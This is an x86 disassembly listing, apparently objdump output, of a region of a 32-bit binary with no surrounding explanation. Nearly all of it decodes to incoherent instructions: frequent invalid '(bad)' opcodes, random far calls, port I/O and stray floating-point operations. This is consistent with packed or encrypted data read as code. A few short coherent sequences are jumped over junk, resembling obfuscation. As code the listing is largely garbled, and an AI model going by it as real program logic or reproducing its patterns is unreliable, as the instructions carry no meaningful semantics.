  40c5bd:	jge    0x40c61f
  40c5bf:	js     0x40c55a
  40c5c1:	push   eax
  40c5c2:	sub    al,0xde
  40c5c4:	fbld   TBYTE PTR [edi-0x7f]
  40c5c7:	es fwait
  40c5c9:	dec    ebx
  40c5ca:	retf   0x1bd9
  40c5cd:	inc    edx
  40c5ce:	mov    edx,0xcdc313e7
  40c5d3:	aad    0xe3
  40c5d5:	and    DWORD PTR [ebx-0x4acb2ad5],edx
  40c5db:	or     al,0x25
  40c5dd:	call   0xe8cf:0xb362d30d
  40c5e4:	add    BYTE PTR [ebx-0x1],0xf1
  40c5e8:	sti    
  40c5e9:	xchg   edi,eax
  40c5ea:	xchg   esp,eax
  40c5eb:	xor    ebx,DWORD PTR [eax+0x18ab6230]
  40c5f1:	dec    ebp
  40c5f2:	addr16 inc ebx
  40c5f4:	aaa    
  40c5f5:	fbld   TBYTE PTR [esi+0x7d]
  40c5f8:	sbb    al,0xc
  40c5fa:	mov    dh,0xf6
  40c5fc:	(bad)  
  40c5fd:	add    al,0xf6
  40c5ff:	nop
  40c600:	in     eax,0x72
  40c602:	jae    0x40c5f5
  40c604:	lods   al,BYTE PTR ds:[esi]
  40c605:	loope  0x40c5da
  40c607:	scas   al,BYTE PTR es:[edi]
  40c608:	hlt    
  40c609:	push   es
  40c60a:	ja     0x40c684
  40c60c:	xor    BYTE PTR [ecx+0x5],ch
  40c60f:	push   ebx
  40c611:	fs mov dh,0x97
  40c614:	pop    es
  40c615:	mov    esi,0x5af07b21
  40c61a:	xchg   esp,eax
  40c61b:	in     eax,dx
  40c61c:	das    
  40c61d:	dec    esp
  40c61e:	inc    eax
  40c61f:	outs   dx,DWORD PTR ds:[esi]
  40c620:	xchg   edx,eax
  40c621:	retf   0xd610
  40c624:	je     0x40c5ca
  40c626:	test   eax,0x78761f13
  40c62b:	inc    ecx
  40c62c:	nop
  40c62d:	scas   eax,DWORD PTR es:[edi]
  40c62e:	lds    esp,FWORD PTR [eax+0x14265bd5]
  40c634:	inc    esp
  40c635:	in     al,dx
  40c636:	dec    ebx
  40c637:	jno    0x40c60d
  40c639:	or     bh,BYTE PTR [eax-0x2a]
  40c63c:	push   ds
  40c63d:	aas    
  40c63e:	pop    ecx
  40c63f:	pop    esi
  40c640:	sub    BYTE PTR [eax],dl
  40c642:	push   ds
  40c643:	cwde   
  40c644:	mov    ah,0x8a
  40c646:	jle    0x40c5e0
  40c648:	mov    edx,DWORD PTR [ecx]
  40c64a:	jno    0x40c66c
  40c64c:	ret    0x725a
  40c64f:	pop    ebp
  40c650:	iret   
  40c651:	es mov ebp,0x3500eb1a
  40c657:	cmp    al,0x20
  40c659:	mov    ebp,0x7d338118
  40c65e:	sbb    BYTE PTR [ebx+0x162aedd2],dl
  40c664:	sbb    ebp,ecx
  40c666:	xor    eax,0x99cbdf60
  40c66b:	xlat   BYTE PTR ds:[ebx]
  40c66c:	clc    
  40c66d:	xchg   ecx,eax
  40c66e:	in     eax,0x1c
  40c670:	xchg   edi,eax
  40c671:	(bad)  
  40c672:	jmp    0xd625:0x9185b0f6
  40c679:	fstp   QWORD PTR [ecx+0x50]
  40c67c:	jmp    0x1ed63c02
  40c681:	iret   
  40c682:	les    eax,FWORD PTR [ebp+0x5c]
  40c685:	and    esi,DWORD PTR [edi-0x53]
  40c688:	mov    ch,0x74
  40c68a:	lock (bad) 
  40c68c:	ins    BYTE PTR es:[edi],dx
  40c68d:	js     0x40c673
  40c68f:	xchg   edi,eax
  40c690:	jmp    0x40c6a2
  40c692:	sbb    BYTE PTR [ebx+0x2b29592d],bl
  40c698:	jno    0x40c667
  40c69a:	mov    ebx,0xe496a28f
  40c69f:	push   eax
  40c6a0:	xchg   DWORD PTR [edi+0x5a],esp
  40c6a3:	fdiv   QWORD PTR [edx+0x28aba6dd]
  40c6a9:	push   ecx
  40c6aa:	add    esi,ebx
  40c6ac:	and    BYTE PTR [ebx],dh
  40c6ae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c6af:	inc    edx
  40c6b0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c6b1:	mov    ebx,0xb080ebfc
  40c6b6:	push   ebp
  40c6b7:	xchg   DWORD PTR [ebx+edx*4-0x58],esp
  40c6bb:	fdivrp st(0),st
  40c6bd:	xor    BYTE PTR [edx-0x7fb20f89],al
  40c6c3:	xchg   ebp,eax
  40c6c4:	sbb    cl,BYTE PTR [ecx]
  40c6c6:	cmp    edi,edi
  40c6c8:	enter  0x5ee9,0x49
  40c6cc:	(bad)  
  40c6cd:	cmp    al,0xa
  40c6cf:	cmp    eax,0xdd9ea188
  40c6d4:	fwait
  40c6d5:	adc    al,0x90
  40c6d7:	daa    
  40c6d8:	or     eax,0x3c2f5bf
  40c6dd:	(bad)  
  40c6de:	fcmovne st,st(1)
  40c6e0:	icebp  
  40c6e1:	test   DWORD PTR [eax-0x22],edi
  40c6e4:	test   eax,0xd5f5f810
  40c6e9:	fdivr  st(7),st
  40c6eb:	ss xchg ebp,eax
  40c6ed:	xchg   edi,eax
  40c6ee:	lods   al,BYTE PTR ds:[esi]
  40c6ef:	repz cmp eax,0xa951e84a
  40c6f5:	xor    al,0x73
  40c6f7:	push   ebp
  40c6f8:	hlt    
  40c6f9:	push   0xc09bb751
  40c6fe:	jmp    DWORD PTR [ebx+0x26]
  40c701:	mov    esi,DWORD PTR [eax-0x72]
  40c704:	dec    edi
  40c705:	sub    bh,dh
  40c707:	test   BYTE PTR [edi+0x73f1a1ac],ch
  40c70d:	iret   
  40c70e:	jecxz  0x40c72b
  40c710:	cli    
  40c711:	jp     0x40c71a
  40c713:	je     0x40c763
  40c715:	repz (bad) 
  40c717:	inc    edx
  40c718:	push   0x2e2b04d8
  40c71d:	dec    esp
  40c71e:	lods   eax,DWORD PTR ds:[esi]
  40c71f:	xor    eax,0x4f4c2018
  40c724:	aam    0xff
  40c726:	inc    edx
  40c727:	cs (bad) 
  40c729:	fld    DWORD PTR [edi-0x76679c5b]
  40c72f:	dec    esi
  40c730:	es (bad) 
  40c732:	jne    0x40c7af
  40c734:	cli    
  40c735:	mov    esp,DWORD PTR [ebx-0x63]
  40c738:	jae    0x40c745
  40c73a:	sub    BYTE PTR [eax-0x53],dl
  40c73d:	fdivr  QWORD PTR [ecx]
  40c73f:	imul   ebx,DWORD PTR [ebp-0x6a],0xffffffeb
  40c743:	sbb    BYTE PTR [esi],0xec
  40c746:	push   es
  40c747:	add    ecx,DWORD PTR [esi+0xf]
  40c74a:	adc    BYTE PTR [ecx],ah
  40c74c:	and    dh,ah
  40c74e:	mov    al,0x52
  40c750:	push   0xb9f650f
  40c755:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c756:	rcr    DWORD PTR [esi-0x36],cl
  40c759:	into   
  40c75a:	push   esp
  40c75b:	std    
  40c75c:	adc    DWORD PTR [ecx],esp
  40c75e:	pusha  
  40c75f:	repz pusha 
  40c761:	mov    eax,DWORD PTR [esp-0x6]
  40c765:	std    
  40c766:	or     al,0x63
  40c768:	jns    0x40c754
  40c76a:	les    eax,FWORD PTR [edx-0x16]
  40c76d:	jmp    0x63ed41bb
  40c772:	out    0xdb,eax
  40c774:	add    DWORD PTR [esi+ebp*2+0x11734e95],edi
  40c77b:	cmp    edi,ebx
  40c77d:	add    BYTE PTR [edi],ah
  40c77f:	repnz sub BYTE PTR [edx],bl
  40c782:	mov    ss,eax
  40c784:	mov    ebp,0x324cade9
  40c789:	test   eax,0x5d3fdfae
  40c78e:	repnz xor eax,0x54cd22e0
  40c794:	out    dx,al
  40c795:	pop    ss
  40c796:	and    al,0xa2
  40c798:	fild   WORD PTR [edi-0x367b80ca]
  40c79e:	cli    
  40c79f:	sti    
  40c7a0:	adc    ch,ch
  40c7a2:	loope  0x40c818
  40c7a4:	or     ebp,eax
  40c7a6:	lock dec esp
  40c7a8:	repz mov al,0x84
  40c7ab:	clc    
  40c7ac:	pop    es
  40c7ad:	add    al,0xdb
  40c7af:	fiadd  DWORD PTR ds:0xbaf03228
  40c7b5:	ss xchg ecx,eax
  40c7b7:	nop
  40c7b8:	loope  0x40c744
  40c7ba:	add    DWORD PTR [edi+edi*4],ebx
  40c7bd:	jp     0x40c808
  40c7bf:	bsf    ebp,DWORD PTR [edx+0x79]
  40c7c3:	and    ch,bl
  40c7c5:	(bad)  
  40c7c6:	push   esp
  40c7c7:	ds or  eax,0xbb7e8a82
  40c7cd:	xor    esp,eax
  40c7cf:	xor    BYTE PTR [edi],ch
  40c7d1:	mov    bh,0x92
  40c7d3:	addr16 push es
  40c7d5:	add    DWORD PTR [ebp+ebp*2+0x16],edi
  40c7d9:	sub    BYTE PTR [ebx+0x6],al
  40c7dc:	ins    DWORD PTR es:[edi],dx
  40c7dd:	add    eax,DWORD PTR [edx-0xad4dc85]
  40c7e3:	adc    al,0x87
  40c7e5:	sub    cl,BYTE PTR es:[ecx]
  40c7e8:	push   edi
  40c7e9:	rol    cl,1
  40c7eb:	jl     0x40c808
  40c7ed:	cmp    eax,0x28ea418d
  40c7f2:	push   ebx
  40c7f3:	sub    DWORD PTR [eax-0x46],ebp
  40c7f6:	inc    ebx
  40c7f7:	jnp    0x40c7c9
  40c7f9:	sub    ebx,edi
  40c7fb:	ret    0x8d1c
  40c7fe:	xchg   ecx,eax
  40c7ff:	stos   DWORD PTR es:[edi],eax
  40c800:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c801:	sbb    ah,BYTE PTR [esi]
  40c803:	or     dh,0x84
  40c806:	lods   eax,DWORD PTR ds:[esi]
  40c807:	mov    ah,0xbe
  40c809:	in     al,0xbe
  40c80b:	push   edi
  40c80c:	xor    eax,ebp
  40c80e:	xchg   ecx,eax
  40c80f:	jecxz  0x40c7cf
  40c811:	mov    esp,DWORD PTR [esi]
  40c813:	mov    eax,ds:0xc6de96fd
  40c818:	pop    ebx
  40c819:	or     DWORD PTR [ecx-0x36],ecx
  40c81c:	inc    ecx
  40c81d:	add    cl,cl
  40c81f:	add    eax,0x2577627b
  40c824:	outs   dx,BYTE PTR ds:[esi]
  40c825:	js     0x40c852
  40c827:	jp     0x40c89f
  40c829:	cmp    eax,0x4a05b7cb
  40c82e:	and    eax,0x46a1fd54
  40c833:	mov    eax,ds:0x5cf0e0de
  40c838:	sbb    ebp,esp
  40c83a:	in     al,0x73
  40c83c:	mov    esp,0x540769a7
  40c841:	add    eax,0x6f592e01
  40c846:	pushf  
  40c847:	cwde   
  40c848:	add    eax,0xb1b8f56a
  40c84d:	iret   
  40c84e:	jno    0x40c7ea
  40c850:	shl    DWORD PTR [ebx-0x33],0x1b
  40c854:	xlat   BYTE PTR ds:[ebx]
  40c855:	pop    eax
  40c856:	and    al,0x73
  40c858:	sti    
  40c859:	je     0x40c8c4
  40c85b:	pop    eax
  40c85c:	rol    BYTE PTR [ebx],0x24
  40c85f:	je     0x40c859
  40c861:	pushf  
  40c862:	loopne 0x40c803
  40c864:	outs   dx,DWORD PTR ds:[esi]
  40c865:	clc    
  40c866:	xor    al,0x8b
  40c868:	dec    esp
  40c869:	sbb    dl,dl
  40c86b:	xor    edx,ebp
  40c86d:	mov    DWORD PTR [ebp-0x20],0x2a7b
  40c874:	mov    DWORD PTR [ebp-0x1c],0x718f
  40c87b:	mov    eax,DWORD PTR [ebp-0x20]
  40c87e:	jmp    0x40cc89
  40c883:	(bad)  
  40c884:	fisubr DWORD PTR [edx+0x36]
  40c887:	mov    esp,0x55fc93b6
  40c88c:	or     eax,0x303ce3ac
  40c891:	or     dl,BYTE PTR [edx-0x41412817]
  40c897:	xchg   edx,eax
  40c898:	les    edi,FWORD PTR [esi-0x950a042]
  40c89e:	fadd   st(5),st
  40c8a0:	or     ch,al
  40c8a2:	fidivr WORD PTR [esi]
  40c8a4:	fcmovbe st,st(6)
  40c8a6:	xchg   edx,eax
  40c8a7:	sub    al,0x32
  40c8a9:	mov    BYTE PTR [ebx+edi*4],bl
  40c8ac:	fs sub al,0x1b
  40c8af:	psrld  mm7,QWORD PTR [edi+0x44972cd0]
  40c8b6:	call   0xff8f:0x2e05005
  40c8bd:	test   al,0x79
  40c8bf:	jmp    0x7e9a:0x44d0fb95
  40c8c6:	stos   BYTE PTR es:[edi],al
  40c8c7:	hlt    
  40c8c8:	pop    ds
  40c8c9:	shl    DWORD PTR [ebp-0x2573176b],0x80
  40c8d0:	shl    DWORD PTR [ebx-0x56],cl
  40c8d3:	sub    DWORD PTR [edi+0x3a],0xd6742b9
  40c8da:	stc    
  40c8db:	imul   esp,DWORD PTR [ebp-0x2fd09804],0x0
  40c8e2:	xchg   edx,eax
  40c8e3:	push   es
  40c8e4:	std    
  40c8e5:	loope  0x40c8b2
  40c8e7:	sbb    esi,0xad68289e
  40c8ed:	pop    esp
  40c8ee:	mov    edi,0xac1c7e79
  40c8f3:	or     al,0x12
  40c8f5:	push   es
  40c8f6:	xchg   edx,eax
  40c8f7:	mov    dh,BYTE PTR [eax]
  40c8f9:	leave  
  40c8fa:	add    al,0x7a
  40c8fc:	cwde   
  40c8fd:	js     0x40c8e9
  40c8ff:	mul    ch
  40c901:	aaa    
  40c902:	mov    ds,WORD PTR [edx-0x7ddcb5a9]
  40c908:	push   esi
  40c909:	mov    fs,WORD PTR [esi]
  40c90b:	pop    eax
  40c90c:	inc    eax
  40c90d:	sub    al,0x22
  40c90f:	push   ebp
  40c910:	outs   dx,DWORD PTR ds:[esi]
  40c911:	xlat   BYTE PTR ds:[ebx]
  40c912:	mov    cl,0x8c
  40c914:	popa   
  40c915:	rol    BYTE PTR [ebx-0x2d],1
  40c918:	mov    esp,0x765b9284
  40c91d:	push   0xbbe3ddfd
  40c922:	sbb    eax,DWORD PTR [eax-0x40]
  40c925:	mul    BYTE PTR [esi-0x5d]
  40c928:	je     0x40c92b
  40c92a:	fistp  QWORD PTR [eax]
  40c92c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c92d:	sbb    al,0x67
  40c92f:	test   DWORD PTR [edx+0x3a5b50ec],edx
  40c935:	jno    0x40c95f
  40c937:	int3   
  40c938:	mov    edi,0xf35b895b
  40c93d:	in     al,dx
  40c93e:	xchg   DWORD PTR [ebp-0x93a131e],ebp
  40c944:	cs mov ebx,0x40574f99
  40c94a:	adc    eax,0xdf9fc911
  40c94f:	push   edi
  40c950:	mov    ebx,0x3ea3668d
  40c955:	stos   DWORD PTR es:[edi],eax
  40c956:	sbb    al,0x51
  40c958:	mov    edi,0x2905e8aa
  40c95d:	frstor [eax-0x39]
  40c960:	jae    0x40c9de
  40c962:	and    dh,dl
  40c964:	push   esp
  40c965:	pop    ss
  40c966:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c967:	stos   DWORD PTR es:[edi],eax
  40c968:	pop    ecx
  40c969:	add    dh,BYTE PTR [eax-0x32]
  40c96c:	push   ebx
  40c96d:	push   0x255302bf
  40c972:	inc    esp
  40c973:	or     dh,BYTE PTR [ebx-0x6b]
  40c976:	out    dx,eax
  40c977:	sub    al,0xd3
  40c979:	loope  0x40c972
  40c97b:	int3   
  40c97c:	dec    ebp
  40c97d:	(bad)  
  40c97e:	jg     0x40c92d
  40c980:	aaa    
  40c981:	es mov esi,0x4471880f
  40c987:	test   DWORD PTR [ebx+ebx*1],edi
  40c98a:	stc    
  40c98b:	xor    ch,BYTE PTR [ebp-0x149baaff]
  40c991:	push   eax
  40c992:	and    eax,DWORD PTR [eax+0x14]
  40c995:	jns    0x40ca0d
  40c997:	inc    ecx
  40c998:	cwde   
  40c999:	loopne 0x40c962
  40c99b:	ds pop es
  40c99d:	mov    ebp,0x8f51820e
  40c9a2:	push   ds
  40c9a3:	xchg   edx,eax
  40c9a4:	(bad)  [ecx-0x2976b638]
  40c9aa:	repz loopne 0x40c9c9
  40c9ad:	sbb    eax,0xffffff94
  40c9b0:	mov    esp,0x91466bc9
  40c9b5:	and    dl,BYTE PTR [ecx]
  40c9b7:	dec    edx
  40c9b8:	and    al,0xdc
  40c9ba:	(bad)  
  40c9bb:	out    dx,al
  40c9bc:	adc    bh,BYTE PTR [edx]
  40c9be:	mov    ds:0x2e491239,al
  40c9c3:	loope  0x40c987
  40c9c5:	mov    cl,0xb9
  40c9c7:	xchg   esi,eax
  40c9c8:	mov    edi,0x161c23a5
  40c9cd:	int3   
  40c9ce:	outs   dx,BYTE PTR ds:[esi]
  40c9cf:	sub    ecx,DWORD PTR [ebx-0x6741f50b]
  40c9d5:	xlat   BYTE PTR ds:[ebx]
  40c9d6:	sub    eax,0x492341d
  40c9db:	out    0x89,eax
  40c9dd:	lea    ecx,[esi]
  40c9df:	int    0xb1
  40c9e1:	sar    BYTE PTR [ebp-0xd],0x29
  40c9e5:	in     al,0x47
  40c9e7:	or     ecx,DWORD PTR gs:[edx+0x11753c9a]
  40c9ee:	cld    
  40c9ef:	jmp    0xbbe01e14
  40c9f4:	test   eax,0x4c692e68
  40c9f9:	mov    DWORD PTR [edi+0x11],0xed9b368f
  40ca00:	int    0x9
  40ca02:	cmp    bl,BYTE PTR [ebx+0x2c55231c]
  40ca08:	mov    ch,BYTE PTR ds:0x7f4cd365
  40ca0e:	ss xor eax,0xdd9b541c
  40ca14:	dec    ebx
  40ca15:	add    eax,0xf5d8193a
  40ca1a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ca1b:	mov    ah,0x90
  40ca1d:	dec    edx
  40ca1e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ca1f:	popf   
  40ca20:	les    ebp,FWORD PTR [edi-0xad0d7c0]
  40ca26:	lods   eax,DWORD PTR ds:[esi]
  40ca27:	scas   al,BYTE PTR es:[edi]
  40ca28:	sbb    eax,0xc657e2f
  40ca2d:	loop   0x40c9ea
  40ca2f:	add    eax,0x4a69a96
  40ca34:	data16 sub al,0xf2
  40ca37:	dec    esi
  40ca38:	adc    dh,dl
  40ca3a:	jae    0x40c9e7
  40ca3c:	outs   dx,DWORD PTR ds:[esi]
  40ca3d:	xchg   esp,eax
  40ca3e:	or     eax,0x43659b5d
  40ca43:	lods   al,BYTE PTR ds:[esi]
  40ca44:	inc    ebx
  40ca45:	fcmovb st,st(3)
  40ca47:	mov    dl,0x18
  40ca49:	push   ecx
  40ca4a:	(bad)  
  40ca4b:	clc    
  40ca4c:	outs   dx,BYTE PTR ds:[esi]
  40ca4d:	sti    
  40ca4e:	add    BYTE PTR [edi+0x78],0x85
  40ca52:	mov    bl,0x9d
  40ca54:	retf   0xd108
  40ca57:	inc    esi
  40ca58:	add    al,BYTE PTR [edi*4+0x36ec999b]
  40ca5f:	push   DWORD PTR [ecx+0x6c52f23e]
  40ca65:	lahf   
  40ca66:	dec    ebx
  40ca67:	inc    ecx
  40ca68:	in     eax,dx
  40ca69:	push   0xffffffc9
  40ca6b:	add    ah,BYTE PTR [eax+0x24cbb766]
  40ca71:	and    dl,ch
  40ca73:	jp     0x40ca2c
  40ca75:	dec    edx
  40ca76:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ca78:	mov    esi,DWORD PTR [edx-0x3342743e]
  40ca7e:	and    DWORD PTR [esi],esi
  40ca80:	loop   0x40ca43
  40ca82:	mov    ds:0x758853ed,eax
  40ca87:	inc    eax
  40ca88:	out    dx,al
  40ca89:	sub    al,dh
  40ca8b:	shl    BYTE PTR cs:[eax+esi*8+0x2b],1
  40ca90:	das    
  40ca91:	cli    
  40ca92:	jl     0x40cab0
  40ca94:	cmp    DWORD PTR ds:0xe7c1ffde,eax
  40ca9a:	and    dh,cl
  40ca9c:	gs mov esp,eax
  40ca9f:	push   ebp
  40caa0:	push   esi
  40caa1:	or     eax,0x658a1fe4
  40caa6:	aam    0xaf
  40caa8:	(bad)  
  40caa9:	pavgw  mm0,QWORD PTR ds:[edx]
  40caad:	in     eax,dx
  40caae:	mov    ecx,0xe56257d6
  40cab3:	mov    edx,DWORD PTR [edx+edx*1+0x69b5fc45]
  40caba:	cmp    BYTE PTR [edx+eax*1],bh
  40cabd:	mov    DWORD PTR [edx+0x1a],edx
  40cac0:	das    
  40cac1:	jle    0x40ca78
  40cac3:	popa   
  40cac4:	sti    
  40cac5:	cmp    DWORD PTR [esi],esi
  40cac7:	push   esp
  40cac8:	outs   dx,BYTE PTR ds:[esi]
  40cac9:	fbld   TBYTE PTR [eax+0x68e45861]
  40cacf:	ss or  dl,ch
  40cad2:	scas   al,BYTE PTR es:[edi]
  40cad3:	out    0x9,eax
  40cad5:	xor    ebx,DWORD PTR ds:0xc35dd7f4
  40cadb:	pushf  
  40cadc:	jl     0x40caeb
  40cade:	hlt    
  40cadf:	test   al,0x31
  40cae1:	in     al,dx
  40cae2:	and    cl,BYTE PTR [esi+0x69]
  40cae5:	iret   
  40cae6:	xchg   esp,eax
  40cae7:	xor    esp,DWORD PTR [eax+0x1e4bd2fe]
  40caed:	mov    eax,0xc9da53
  40caf2:	iret   
  40caf3:	call   0x93f83a19
  40caf8:	add    BYTE PTR [ecx-0x2c],cl
  40cafb:	pop    ebp
  40cafc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cafd:	shl    DWORD PTR [edi-0x46edbe92],1
  40cb03:	aaa    
  40cb04:	fcom   QWORD PTR [edi]
  40cb06:	dec    edx
  40cb07:	sub    esi,DWORD PTR [eax-0x74]
  40cb0a:	leave  
  40cb0b:	imul   ch
  40cb0d:	sbb    ebp,edx
  40cb0f:	rcl    cl,cl
  40cb11:	shl    DWORD PTR [ebp+0x7],cl
  40cb14:	test   DWORD PTR [ebx+0x5f],esi
  40cb17:	cmp    eax,0x799f2b00
  40cb1c:	push   ebp
  40cb1d:	mov    edi,0xef01a01e
  40cb22:	jb     0x40cb96
  40cb24:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cb25:	popa   
  40cb26:	mov    ch,BYTE PTR ds:0x6f7f9e18
  40cb2c:	outs   dx,DWORD PTR ds:[esi]
  40cb2d:	sub    BYTE PTR [edi],al
  40cb2f:	(bad)  
  40cb30:	xor    eax,0x1bfbc6e6
  40cb35:	or     edi,DWORD PTR [ebp-0x21]
  40cb38:	bound  ebp,QWORD PTR [esi+eiz*2+0x0]
  40cb3c:	pop    ebp
  40cb3d:	mov    ecx,0xe79e4568
  40cb42:	test   al,0xd6
  40cb44:	popf   
  40cb45:	sbb    ah,BYTE PTR [ebx-0xa]
  40cb48:	pushf  
  40cb49:	sbb    edi,DWORD PTR [eax+eax*2+0x6ae4b991]
  40cb50:	mov    cl,0x62
  40cb52:	pop    eax
  40cb53:	cs aam 0xaf
  40cb56:	push   ecx
  40cb57:	cmp    BYTE PTR [edi+edx*8+0x69],ch
  40cb5b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cb5c:	jb     0x40cb0a
  40cb5e:	sub    bl,BYTE PTR [esi+esi*4+0x5e]
  40cb62:	xchg   esp,eax
  40cb63:	xchg   ecx,eax
  40cb64:	mov    ecx,0x98554a69
  40cb69:	in     al,dx
  40cb6a:	push   ebx
  40cb6b:	outs   dx,BYTE PTR ds:[esi]
  40cb6c:	arpl   WORD PTR [edi+0x30],sp
  40cb6f:	mov    ebp,0xf83b59be
  40cb74:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cb75:	mov    ebx,0xf45e6b92
  40cb7a:	dec    edx
  40cb7b:	(bad)  
  40cb7c:	int3   
  40cb7d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cb7e:	mov    WORD PTR [edx+0x33],gs
  40cb81:	loope  0x40cbc2
  40cb83:	jbe    0x40cb1b
  40cb85:	int3   
  40cb86:	mov    ebp,0x365a4e34
  40cb8b:	shl    BYTE PTR [ecx-0x6a],1
  40cb8e:	lds    ebp,FWORD PTR [edx-0x7ecf8156]
  40cb94:	aaa    
  40cb95:	push   edx
  40cb96:	shl    DWORD PTR ss:[ecx+eax*8-0x3fdb89f5],cl
  40cb9e:	test   DWORD PTR [edi],eax
  40cba0:	push   es
  40cba1:	call   0xeb17fc27
  40cba6:	adc    edi,ebp
  40cba8:	jle    0x40cc20
  40cbaa:	lahf   
  40cbab:	fs loop 0x40cba4
  40cbae:	and    al,0xac
  40cbb0:	int    0xa3
  40cbb2:	aaa    
  40cbb3:	mov    dh,0x74
  40cbb5:	loop   0x40cbd7
  40cbb7:	dec    esp
  40cbb8:	jge    0x40cbd3
  40cbba:	pop    ds
  40cbbb:	mov    dl,0x94
  40cbbd:	jge    0x40cb5c
  40cbbf:	add    BYTE PTR [ebp-0x23],0xce
  40cbc3:	pop    ss
  40cbc4:	stos   BYTE PTR es:[edi],al
  40cbc5:	and    BYTE PTR [esi+edx*4-0x80],0x6c
  40cbca:	aam    0x15
  40cbcc:	mov    ebp,0xef086709
  40cbd1:	enter  0xf232,0xc6
  40cbd5:	cmp    esi,DWORD PTR [esi+eax*8]
  40cbd8:	xchg   ecx,eax
  40cbd9:	loop   0x40cbc8
  40cbdb:	(bad)  
  40cbdc:	mov    esi,DWORD PTR [ecx+0xfac8dbd]
  40cbe2:	popf   
  40cbe3:	ins    BYTE PTR es:[edi],dx
  40cbe4:	pop    esp
  40cbe5:	mov    ds,WORD PTR [edi]
  40cbe7:	mov    BYTE PTR [ebx+0x77],dh
  40cbea:	cs ret 
  40cbec:	cdq    
  40cbed:	inc    esp
  40cbee:	hlt    
  40cbef:	(bad)  
  40cbf0:	call   0x944efe90
  40cbf5:	jae    0x40cc67
  40cbf7:	adc    eax,0x7c13882b
  40cbfc:	sbb    DWORD PTR [ebx+0x4],edi
  40cbff:	int3   
  40cc00:	mov    WORD PTR [eax-0x80],gs
  40cc03:	fisttp QWORD PTR [edx+0x28]
  40cc06:	inc    edi
  40cc07:	std    
  40cc08:	sahf   
  40cc09:	into   
  40cc0a:	adc    BYTE PTR [ecx+edi*2],bl
  40cc0d:	mov    al,bh
  40cc0f:	push   ecx
  40cc10:	cdq    
  40cc11:	jg     0x40cb9d
  40cc13:	add    al,0x32
  40cc15:	xchg   esp,eax
  40cc16:	or     eax,0x1649c116
  40cc1b:	xchg   edx,eax
  40cc1c:	scas   al,BYTE PTR es:[edi]
  40cc1d:	cwde   
  40cc1e:	sub    eax,eax
  40cc20:	pop    ebx
  40cc21:	sbb    al,dh
  40cc23:	ret    
  40cc24:	aaa    
  40cc25:	(bad)  
  40cc26:	clc    
  40cc27:	pop    esi
  40cc28:	cld    
  40cc29:	outs   dx,BYTE PTR ds:[esi]
  40cc2a:	fwait
  40cc2b:	out    dx,al
  40cc2c:	jns    0x40cc01
  40cc2e:	and    al,0xeb
  40cc30:	sub    DWORD PTR [ecx-0x41],ebp
  40cc33:	or     ch,BYTE PTR ds:0xa48f24e4
  40cc39:	mov    al,0xe7
  40cc3b:	and    edi,DWORD PTR [eax+0x1a6ca933]
  40cc41:	icebp  
  40cc42:	dec    esp
  40cc43:	call   0x99e9:0xb0cd11fb
  40cc4a:	popa   
  40cc4b:	bound  esp,QWORD PTR [edi]
  40cc4d:	xchg   esp,eax
  40cc4e:	outs   dx,BYTE PTR ds:[esi]
  40cc4f:	(bad)  
  40cc50:	repz jg 0x40cc97
  40cc53:	lock pop edx
  40cc55:	ins    DWORD PTR es:[edi],dx
  40cc56:	sub    dh,cl
  40cc58:	int3   
  40cc59:	into   
  40cc5a:	cmp    bh,BYTE PTR [ecx]
  40cc5c:	lea    eax,[eax+edx*8-0x6d]
  40cc60:	in     eax,dx
  40cc61:	out    dx,eax
  40cc62:	in     eax,0x5d
  40cc64:	jbe    0x40ccd3
  40cc66:	xchg   edx,eax
  40cc67:	in     eax,0xaa
  40cc69:	sbb    DWORD PTR [esi-0x47d24df3],ecx
  40cc6f:	cmp    edi,DWORD PTR [ecx]
  40cc71:	popf   
  40cc72:	mov    ebp,DWORD PTR [ecx+0x210d8863]
  40cc78:	out    dx,eax
  40cc79:	sub    dl,BYTE PTR [edx+edx*2]
  40cc7c:	add    BYTE PTR [ebx],al
  40cc7e:	push   esp
  40cc7f:	pop    esp
  40cc80:	pop    esp
  40cc81:	mov    ebp,0x498cb6e5
  40cc86:	addr16 mov eax,ds:0x8b38
  40cc8a:	push   ebp
  40cc8b:	in     al,0x8b
  40cc8d:	jne    0x40cc67
  40cc8f:	mov    ebx,DWORD PTR [ebp-0x24]
  40cc92:	add    eax,0xffffc948
  40cc97:	adc    edx,0xffff87b0
  40cc9d:	or     eax,esi
  40cc9f:	mov    esi,DWORD PTR [ebp-0x40]
  40cca2:	or     eax,esi
  40cca4:	or     edx,ebx
  40cca6:	mov    ebx,DWORD PTR [ebp-0x3c]
  40cca9:	mov    esi,DWORD PTR [ebp-0x38]
  40ccac:	or     edx,ebx
  40ccae:	mov    ebx,DWORD PTR [ebp-0x34]
  40ccb1:	sub    eax,esi
  40ccb3:	mov    esi,DWORD PTR [ebp-0x48]
  40ccb6:	sbb    edx,ebx
  40ccb8:	mov    ebx,DWORD PTR [ebp-0x44]
  40ccbb:	or     eax,esi
  40ccbd:	or     edx,ebx
  40ccbf:	add    eax,0x89b
  40ccc4:	jmp    0x40d0cf
  40ccc9:	popf   
  40ccca:	call   0xbabc:0x1b7c1940
  40ccd1:	pop    eax
  40ccd2:	out    0xe9,eax
  40ccd4:	jecxz  0x40cd24
  40ccd6:	pop    esp
  40ccd7:	repnz iret 
  40ccd9:	mov    ebp,0x92bebedf
  40ccde:	les    edi,FWORD PTR [esi-0x68012a42]
  40cce4:	ret    
  40cce5:	int3   
  40cce6:	pop    eax
  40cce7:	and    ebx,eax
  40cce9:	adc    esi,esi
  40cceb:	adc    ecx,DWORD PTR [eax-0x40]
  40ccee:	gs pop ecx
  40ccf0:	mov    ch,0x99
  40ccf2:	in     al,dx
  40ccf3:	aad    0x25
